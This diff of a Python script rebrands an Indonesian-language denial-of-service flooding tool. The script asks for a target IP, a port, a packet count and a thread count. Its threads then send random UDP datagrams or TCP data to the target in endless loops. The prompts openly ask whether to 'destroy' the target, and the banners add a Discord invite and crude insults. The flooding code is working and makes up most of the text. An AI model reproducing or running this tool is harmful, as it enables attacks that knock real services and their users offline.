@@ -1,39 +1,49 @@
+#!/usr/bin/env python3
 import random
 import socket
 import threading
-print("""
 
+print("""\033[91m
+
+                 RAMEKE BY UFTTT
 ██╗░░░██╗███████╗████████╗████████╗████████╗
 ██║░░░██║██╔════╝╚══██╔══╝╚══██╔══╝╚══██╔══╝
 ██║░░░██║█████╗░░░░░██║░░░░░░██║░░░░░░██║░░░
 ██║░░░██║██╔══╝░░░░░██║░░░░░░██║░░░░░░██║░░░
 ╚██████╔╝██║░░░░░░░░██║░░░░░░██║░░░░░░██║░░░
 ░╚═════╝░╚═╝░░░░░░░░╚═╝░░░░░░╚═╝░░░░░░╚═╝░░░ """)
-print("UFTTT NIH BOSS")
-print("RAMEKE BY UFTT,Xlabador,ndagog")
-print("GUNAKAN TOOLS INI JANGAN ABUSE")
 
-ip = str(input(" IP:"))
-port = int(input(" PORT:"))
-choice = str(input(" Y ORE N(y/n):"))
-times = int(input(" Packets per one connection:"))
-threads = int(input(" Threads:"))
+print       (" - - > AUTHOR : UFTTT    CODE : UFTTT < - - ")
+print       (" - - > UFTTT x XLABADOR NIH BOS!! < - - ")
+print       ("- - > RAMEKE BY UFTTT,XLABADOR,NDAGOG")
+print       (" - - > AJARIN CUPU DONG BANG XIXI < - - ")
+print       (" - - > UFTTT#2876 & Genre#1570 <- - ")                                   
+print       (" - - > KALO MAU RENAME PM GUA DULU NGENTOD < - - ")
+print       (" - - > PENCET LINK DIBAWAH AJG < - - ")
+print       (" - - > https://discord.gg/BSPhzrpm <- -")
+print       (" - - > GA JOIN = ANAK HARAM < - - ")
+    
+ip = str(input("  Ip Nya:"))
+port = int(input(" Port Nya:"))
+choice = str(input(" HANCURIN GAK NICH? (y/n):"))
+times = int(input(" MAU BERAPA PAKET:"))
+threads = int(input(" KIRIM BERAPA BARANGNYA:"))
 def run():
 	data = random._urandom(1025)
-	i = random.choice(("[*]","[!]","[#]"))
+	i = random.choice(("[+]","[-]"))
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" BENTAR LAGI DOWN YA!!!")
+			print(i +"\033[91m Ufttt x Xlabador NIH BOS!!")
 		except:
-			print("[!] MAMPUS DOWN!!!")
+			print("[!] GASUKA BAYWAN DECK!!!")
 
 def run2():
 	data = random._urandom(16)
-	i = random.choice(("[*]","[!]","[#]"))
+	i = random.choice(("[]","[!]","[#]","[+]"))
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -41,11 +51,11 @@ def run2():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +" BENTAR LAGI DOWN YA!!!")
+			print(i +"\033[91m Ufttt x Xlabador NIH BOS!! ")
 		except:
 			s.close()
-			print("[*] MAMPUS DOWN!!!")
-
+			print("[] GASUKA BAYWAN DECK!!!")
+            
 for y in range(threads):
 	if choice == 'y':
 		th = threading.Thread(target = run)
